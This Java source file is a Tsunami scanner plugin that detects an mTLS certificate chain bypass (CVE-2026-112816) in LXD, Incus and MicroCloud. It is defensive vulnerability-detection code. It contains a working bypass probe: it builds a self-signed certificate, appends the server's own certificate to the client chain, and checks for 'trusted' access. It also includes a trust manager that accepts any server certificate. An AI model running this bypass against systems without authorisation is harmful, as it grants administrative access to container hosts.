/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.credentials.lxdmtlsbypass;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.base.Ascii;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableSet;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.HostAndPort;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParseException;
import com.google.gson.JsonParser;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForServiceName;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.TransportProtocol;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.security.GeneralSecurityException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Principal;
import java.security.PrivateKey;
import java.security.SecureRandom;
import java.security.Signature;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.time.Clock;
import java.util.Objects;
import javax.inject.Inject;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLEngine;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509ExtendedKeyManager;
import javax.net.ssl.X509TrustManager;
import org.jspecify.annotations.Nullable;

/**
 * A {@link VulnDetector} that detects CVE-2026-112816 (GHSA-xg75-xf37-cph9) mTLS certificate chain
 * validation bypass in Canonical LXD, Incus, and MicroCloud.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "LxdMtlsAuthBypassDetector",
    version = "0.1",
    description =
        "Detects mTLS certificate chain validation bypass (CVE-2026-112816) in Canonical LXD,"
            + " Incus, and MicroCloud.",
    author = "Google",
    bootstrapModule = LxdMtlsAuthBypassDetectorBootstrapModule.class)
@ForWebService
@ForServiceName({
  "http",
  "https",
  "https-alt",
  "ssl/http",
  "ssl/https",
  "ssl/https-alt",
  "ssl/unknown",
  "unknown",
  "tcpwrapped",
  "pcsync-https",
  "lxd",
  "incus"
})
public final class LxdMtlsAuthBypassDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final int DEFAULT_TIMEOUT_MS = 5000;
  private static final int MAX_RESPONSE_BYTES = 65536;
  private static final int DEFAULT_LXD_PORT = 8443;

  private static final ImmutableSet<String> SUPPORTED_SERVICES =
      ImmutableSet.of(
          "",
          "http",
          "https",
          "https-alt",
          "ssl/http",
          "ssl/https",
          "ssl/https-alt",
          "ssl/unknown",
          "unknown",
          "tcpwrapped",
          "pcsync-https",
          "lxd",
          "incus");

  private final Clock utcClock;
  private final int timeoutMs;

  @Inject
  LxdMtlsAuthBypassDetector(@UtcClock Clock utcClock) {
    this(utcClock, DEFAULT_TIMEOUT_MS);
  }

  @VisibleForTesting
  LxdMtlsAuthBypassDetector(Clock utcClock, int timeoutMs) {
    this.utcClock = checkNotNull(utcClock);
    this.timeoutMs = timeoutMs;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log( // NOMUTANTS -- diagnostic logging
        "LxdMtlsAuthBypassDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(LxdMtlsAuthBypassDetector::isSupportedService)
                .filter(this::isServiceVulnerable)
                .map(service -> buildDetectionReport(targetInfo, service))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(buildBaseVulnerability());
  }

  @VisibleForTesting
  static boolean isSupportedService(NetworkService service) {
    TransportProtocol tp = service.getTransportProtocol();
    if (tp != TransportProtocol.TCP && tp != TransportProtocol.TRANSPORT_PROTOCOL_UNSPECIFIED) {
      return false;
    }
    if (NetworkServiceUtils.isWebService(service)) {
      return true;
    }
    if (service.getNetworkEndpoint().getPort().getPortNumber() == DEFAULT_LXD_PORT) {
      return true;
    }
    String serviceName = Ascii.toLowerCase(service.getServiceName().trim());
    return SUPPORTED_SERVICES.contains(serviceName);
  }

  private boolean isServiceVulnerable(NetworkService service) {
    HostAndPort hostAndPort = NetworkEndpointUtils.toHostAndPort(service.getNetworkEndpoint());
    String host = hostAndPort.getHost();
    int port = hostAndPort.getPortOrDefault(DEFAULT_LXD_PORT);

    EphemeralIdentity leafIdentity;
    try {
      leafIdentity = generateEphemeralIdentity();
    } catch (GeneralSecurityException | IOException e) { // NOMUTANTS -- defensive crypto error path
      logger.atWarning().withCause(e).log("Failed to generate ephemeral client identity.");
      return false;
    }

    // Probe 1 (Negative Control & Server Certificate Harvest):
    // Present only the ephemeral self-signed leaf certificate. The target must respond as an
    // LXD/Incus /1.0 endpoint with "auth": "untrusted" and provide its own X.509 server
    // certificate during the TLS handshake.
    ProbeResult probe1;
    try {
      probe1 =
          sendApiProbe(
              host,
              port,
              new X509Certificate[] {leafIdentity.certificate},
              leafIdentity.privateKey);
    } catch (IOException | GeneralSecurityException e) {
      logger.atFine().withCause(e).log( // NOMUTANTS -- diagnostic logging
          "Probe 1 to %s:%d did not match LXD/Incus TLS endpoint.", host, port);
      return false;
    }

    if (!probe1.isValidLxdApi || !Objects.equals(probe1.authState, "untrusted")) {
      return false;
    }

    // Probe 2 (Differential Chain Probe):
    // Open a fresh TLS connection presenting [ephemeralLeafCert, serverCert] signed only with the
    // ephemeral leaf private key. Vulnerable LXD/Incus/MicroCloud daemons iterate over all
    // r.TLS.PeerCertificates in (*Daemon).Authenticate and trust PeerCertificates[1].
    ProbeResult probe2;
    try {
      probe2 =
          sendApiProbe(
              host,
              port,
              new X509Certificate[] {leafIdentity.certificate, probe1.serverCert},
              leafIdentity.privateKey);
    } catch (IOException | GeneralSecurityException e) {
      logger.atFine().withCause(e).log( // NOMUTANTS -- diagnostic logging
          "Probe 2 to %s:%d failed.", host, port);
      return false;
    }

    return probe2.isValidLxdApi && Objects.equals(probe2.authState, "trusted");
  }

  @VisibleForTesting
  static final class ProbeResult {
    final boolean isValidLxdApi;
    final String authState;
    final @Nullable X509Certificate serverCert;

    ProbeResult(boolean isValidLxdApi, String authState, @Nullable X509Certificate serverCert) {
      this.isValidLxdApi = isValidLxdApi;
      this.authState = authState;
      this.serverCert = serverCert;
    }
  }

  private ProbeResult sendApiProbe(
      String host, int port, X509Certificate[] clientChain, PrivateKey clientKey)
      throws IOException, GeneralSecurityException {
    SSLContext sslContext = SSLContext.getInstance("TLS");
    sslContext.init(
        new KeyManager[] {new FixedChainKeyManager(clientChain, clientKey)},
        new TrustManager[] {new PermissiveTrustManager()},
        new SecureRandom());

    try (Socket rawSocket = new Socket()) {
      rawSocket.connect(new InetSocketAddress(host, port), timeoutMs);
      rawSocket.setSoTimeout(timeoutMs); // NOMUTANTS -- defensive socket read timeout

      try (SSLSocket sslSocket =
          (SSLSocket) sslContext.getSocketFactory().createSocket(rawSocket, host, port, true)) {
        sslSocket.setSoTimeout(timeoutMs); // NOMUTANTS -- defensive TLS socket read timeout
        sslSocket.startHandshake();

        X509Certificate harvestedServerCert =
            (X509Certificate) sslSocket.getSession().getPeerCertificates()[0];
        // Invalidate session so subsequent probes perform a full TLS handshake.
        sslSocket.getSession().invalidate(); // NOMUTANTS -- prevents TLS session resumption

        String hostHeader = HostAndPort.fromParts(host, port).toString();
        String httpRequest =
            "GET /1.0 HTTP/1.0\r\n"
                + "Host: "
                + hostHeader
                + "\r\n"
                + "User-Agent: TsunamiSecurityScanner\r\n"
                + "Accept: application/json\r\n"
                + "Connection: close\r\n\r\n";

        OutputStream out = sslSocket.getOutputStream();
        out.write(httpRequest.getBytes(UTF_8));
        out.flush(); // NOMUTANTS -- explicit socket stream flush

        byte[] rawResp = sslSocket.getInputStream().readNBytes(MAX_RESPONSE_BYTES);
        String respStr = new String(rawResp, UTF_8);
        return parseLxdHttpResponse(respStr, harvestedServerCert);
      }
    }
  }

  @VisibleForTesting
  static ProbeResult parseLxdHttpResponse(
      String httpResp, @Nullable X509Certificate harvestedServerCert) {
    int headerEnd = httpResp.indexOf("\r\n\r\n");
    if (headerEnd < 0) {
      return new ProbeResult(false, "", harvestedServerCert);
    }
    int firstLineEnd = httpResp.indexOf("\r\n");
    String statusLine = httpResp.substring(0, firstLineEnd);
    if (!statusLine.startsWith("HTTP/1.0 200") && !statusLine.startsWith("HTTP/1.1 200")) {
      return new ProbeResult(false, "", harvestedServerCert);
    }

    String body = httpResp.substring(headerEnd);
    try {
      JsonElement elem = JsonParser.parseString(body);
      if (!elem.isJsonObject()) {
        return new ProbeResult(false, "", harvestedServerCert);
      }
      JsonObject root = elem.getAsJsonObject();
      String type = getStringField(root, "type");
      String statusCode = getStringField(root, "status_code");
      if (!Objects.equals(type, "sync")
          || !Objects.equals(statusCode, "200")
          || !root.has("metadata")) {
        return new ProbeResult(false, "", harvestedServerCert);
      }
      JsonElement metaElem = root.get("metadata");
      if (!metaElem.isJsonObject()) {
        return new ProbeResult(false, "", harvestedServerCert);
      }
      JsonObject metadata = metaElem.getAsJsonObject();
      String apiVersion = getStringField(metadata, "api_version");
      String auth = getStringField(metadata, "auth");
      if (!Objects.equals(apiVersion, "1.0") || auth.isEmpty()) {
        return new ProbeResult(false, "", harvestedServerCert);
      }
      return new ProbeResult(true, auth, harvestedServerCert);
    } catch (JsonParseException e) {
      return new ProbeResult(false, "", harvestedServerCert);
    }
  }

  private static String getStringField(JsonObject obj, String key) {
    if (!obj.has(key) || !obj.get(key).isJsonPrimitive()) {
      return "";
    }
    return obj.get(key).getAsString();
  }

  @VisibleForTesting
  static final class FixedChainKeyManager extends X509ExtendedKeyManager {
    private static final String ALIAS = "tsunami-ephemeral-client";
    private final X509Certificate[] chain;
    private final PrivateKey privateKey;

    FixedChainKeyManager(X509Certificate[] chain, PrivateKey privateKey) {
      this.chain = chain.clone();
      this.privateKey = privateKey;
    }

    @Override
    public String chooseClientAlias(String[] keyType, Principal[] issuers, Socket socket) {
      return ALIAS;
    }

    @Override
    public String chooseEngineClientAlias(String[] keyType, Principal[] issuers, SSLEngine engine) {
      return ALIAS;
    }

    @Override
    public X509Certificate @Nullable [] getCertificateChain(String alias) {
      return Objects.equals(alias, ALIAS) ? chain.clone() : null;
    }

    @Override
    public @Nullable PrivateKey getPrivateKey(String alias) {
      return Objects.equals(alias, ALIAS) ? privateKey : null;
    }

    @Override
    public String[] getClientAliases(String keyType, Principal[] issuers) {
      return new String[] {ALIAS};
    }

    @Override
    public String[] getServerAliases(String keyType, Principal[] issuers) {
      return new String[0];
    }

    @Override
    public @Nullable String chooseServerAlias(String keyType, Principal[] issuers, Socket socket) {
      return null;
    }
  }

  @VisibleForTesting
  static final class PermissiveTrustManager implements X509TrustManager {
    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) {}

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) {}

    @Override
    public X509Certificate[] getAcceptedIssuers() {
      return new X509Certificate[0];
    }
  }

  @VisibleForTesting
  static final class EphemeralIdentity {
    final X509Certificate certificate;
    final PrivateKey privateKey;

    EphemeralIdentity(X509Certificate certificate, PrivateKey privateKey) {
      this.certificate = certificate;
      this.privateKey = privateKey;
    }
  }

  @VisibleForTesting
  static EphemeralIdentity generateEphemeralIdentity()
      throws GeneralSecurityException, IOException {
    KeyPair keyPair = KeyPairGenerator.getInstance("EC").generateKeyPair();

    // X.509 v3 explicit version [0] INTEGER 2 and serialNumber INTEGER 1.
    byte[] version = new byte[] {(byte) 0xa0, 0x03, 0x02, 0x01, 0x02};
    byte[] serial = new byte[] {0x02, 0x01, 0x01};
    // AlgorithmIdentifier for ecdsa-with-SHA256 (OID 1.2.840.10045.4.3.2).
    byte[] sigAlgId =
        new byte[] {
          0x30, 0x0a, 0x06, 0x08, 0x2a, (byte) 0x86, 0x48, (byte) 0xce, 0x3d, 0x04, 0x03, 0x02
        };

    // RelativeDistinguishedName CN=tsunami-probe (OID 2.5.4.3).
    byte[] cnOid = new byte[] {0x06, 0x03, 0x55, 0x04, 0x03};
    byte[] cnVal = derTag(0x0c, "tsunami-probe".getBytes(UTF_8));
    byte[] name = derTag(0x30, derTag(0x31, derTag(0x30, concat(cnOid, cnVal))));

    byte[] notBefore = derTag(0x17, "250101000000Z".getBytes(UTF_8));
    byte[] notAfter = derTag(0x17, "350101000000Z".getBytes(UTF_8));
    byte[] validity = derTag(0x30, concat(notBefore, notAfter));

    byte[] spki = keyPair.getPublic().getEncoded();
    byte[] tbsCert = derTag(0x30, concat(version, serial, sigAlgId, name, validity, name, spki));

    Signature signer = Signature.getInstance("SHA256withECDSA");
    signer.initSign(keyPair.getPrivate());
    signer.update(tbsCert);
    byte[] sigBytes = signer.sign();

    byte[] bitStringPayload = new byte[sigBytes.length + 1];
    System.arraycopy(sigBytes, 0, bitStringPayload, 1, sigBytes.length);
    byte[] sigBitString = derTag(0x03, bitStringPayload);

    byte[] certDer = derTag(0x30, concat(tbsCert, sigAlgId, sigBitString));
    CertificateFactory cf = CertificateFactory.getInstance("X.509");
    X509Certificate cert =
        (X509Certificate) cf.generateCertificate(new ByteArrayInputStream(certDer));
    return new EphemeralIdentity(cert, keyPair.getPrivate());
  }

  private static byte[] derTag(int tag, byte[] content) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    out.write(tag);
    int len = content.length;
    if (len < 128) {
      out.write(len);
    } else if (len < 256) {
      out.write(0x81);
      out.write(len);
    } else {
      out.write(0x82);
      out.write((len >> 8) & 0xff);
      out.write(len & 0xff);
    }
    out.write(content);
    return out.toByteArray();
  }

  private static byte[] concat(byte[]... arrays) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    for (byte[] arr : arrays) {
      out.write(arr);
    }
    return out.toByteArray();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    HostAndPort hp =
        NetworkEndpointUtils.toHostAndPort(vulnerableNetworkService.getNetworkEndpoint());
    Vulnerability vuln =
        buildBaseVulnerability().toBuilder()
            .addAdditionalDetails(
                AdditionalDetail.newBuilder()
                    .setDescription(
                        "Paired differential mTLS certificate chain bypass verified on GET /1.0")
                    .setTextData(
                        TextData.newBuilder()
                            .setText(
                                String.format(
                                    "Target https://%s/1.0 returned \"auth\":\"untrusted\" for a"
                                        + " single self-signed leaf certificate and transitioned"
                                        + " to \"auth\":\"trusted\" when the server's own TLS"
                                        + " certificate was appended as PeerCertificates[1].",
                                    hp))))
            .build();

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(utcClock.instant().toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(vuln)
        .build();
  }

  private static Vulnerability buildBaseVulnerability() {
    return Vulnerability.newBuilder()
        .setMainId(
            VulnerabilityId.newBuilder()
                .setPublisher("GOOGLE")
                .setValue("LXD_INCUS_MTLS_CERT_CHAIN_AUTH_BYPASS"))
        .addRelatedId(VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2026-112816"))
        .setSeverity(Severity.CRITICAL)
        .setTitle(
            "Canonical LXD, Incus & MicroCloud mTLS Certificate Chain Validation Bypass"
                + " (CVE-2026-112816)")
        .setDescription(
            "Canonical LXD (<= 4.0.14, <= 5.0.10, <= 5.21.8, <= 6.9), Linux Containers Incus (<"
                + " 7.6.0), and Canonical MicroCloud (< 2.1.5, < 3.4.1) iterate over every"
                + " certificate in the client's presented TLS certificate chain"
                + " (r.TLS.PeerCertificates) inside (*Daemon).Authenticate and check each"
                + " certificate against the daemon's trust store and server certificate via"
                + " util.CheckTrustState. Because Go's crypto/tls with tls.RequestClientCert only"
                + " verifies private-key possession (CertificateVerify) for the leaf certificate"
                + " (PeerCertificates[0]), an unauthenticated remote attacker can present an"
                + " ephemeral self-signed leaf certificate followed by the target daemon's own"
                + " public TLS server certificate (PeerCertificates[1]) to bypass mTLS"
                + " authentication and obtain full root-equivalent cluster administrative access.")
        .setRecommendation(
            "Upgrade Canonical LXD to >= 4.0.15, >= 5.0.11, >= 5.21.9, or >= 6.10.1, Linux"
                + " Containers Incus to >= 7.6.0, or Canonical MicroCloud to >= 2.1.5 or >= 3.4.1"
                + " so that client certificate trust verification evaluates strictly the leaf"
                + " certificate (r.TLS.PeerCertificates[0]), and restrict exposure of the"
                + " LXD/Incus HTTPS listener (TCP port 8443) to trusted management networks.")
        .build();
  }
}
